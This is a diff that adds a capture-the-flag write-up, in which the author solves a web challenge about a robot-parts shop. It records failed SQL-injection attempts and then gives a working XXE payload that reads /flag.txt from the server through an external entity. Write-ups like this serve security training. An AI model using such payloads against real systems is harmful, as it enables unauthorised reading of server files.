@@ -90,3 +90,90 @@ decrypted_flag = ''.join(chr(value) for value in original_ascii_values)
 
 print(decrypted_flag)
 ```
+
+
+## Parts Shop [Web]
+
+### Task
+
+```
+Parts Shop [Web]
+150
+We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in /flag.txt)
+
+https://uscybercombine-s4-parts-shop.chals.io/
+```
+
+
+### My Solution
+
+1. Enum the site on burp
+  - not strange findings
+2. checked the JS on each page. Noticed /blueprints page is a form. 
+  - tried JS injection `console.log('hello')` ... nope
+  - tried SQL injection with `105 OR 1=1` and etc .. nope
+
+  - curled for XML site maps 
+  `curl -X GET "https://uscybercombine-s4-parts-shop.chals.io/parts" -H "Content-type: text/xml; charset=UTF-8"`
+
+  received this reply:
+```
+<?xml version="1.0" encoding="UTF-8"?><parts><part id="1"><name>XtraGrip Robo Arm 3000</name><author>Bender</author><image>/static/img/xtragrip.png</image><description>A necessity for all tactile machines that need to interact with the human world.</description></part><part id="2"><name>Xray Scan Matrix 1.4</name><author>Baymax</author><image>/static/img/xrayscan.png</image><description>A component for your vision system using X-ray technology to analyze the environment.</description></part><part id="3"><name>ElectroSynth Core U-152</name><author>Optimus Prime</author><image>/static/img/electrosynth.png</image><description>The newest version of the main module for regulating internal functions.</description></part></parts>    
+```
+
+hmmm seems like an interesting lead on part id, let's enum through.... 
+  - tried https://uscybercombine-s4-parts-shop.chals.io/parts?id=4 and etc and URL params ... no luck
+
+
+4. Noticed JS on /blueprints POST payload 
+- seems to be .... printing almost exactly what was being sent... No sanitization of XML... **BINGO!!**
+
+```
+  <script>
+    function generateXML(event) {
+      event.preventDefault();
+
+      var name = document.getElementById('name').value;
+      var author = document.getElementById('author').value;
+      var image = document.getElementById('image').value;
+      var description = document.getElementById('description').value;
+
+      var payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
+        '<part>\n' +
+        '  <name>' + name + '</name>\n' +
+        '  <author>' + author + '</author>\n' +
+        '  <image>' + image + '</image>\n' +
+        '  <description>' + description + '</description>\n' +
+        '</part>';
+
+      fetch("/blueprint", {
+        method: "POST",
+        body: payload,
+      })
+      .then(res => {
+        if (res.redirected) {
+          window.location.href = res.url;
+        } else if (res.status == 400) {
+          document.getElementById("error").innerHTML = "Please fill out all required fields.";
+        }
+      })
+      .catch(error => console.error(error));
+    }
+  </script>
+```
+
+
+5. Intercept POST payload of /blueprints page with XXE and a custom 
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE part [
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<part>
+  <name>&xxe;</name>
+  <author>Test</author>
+  <image>Test</image>
+  <description>Test</description>
+</part>
+
+```
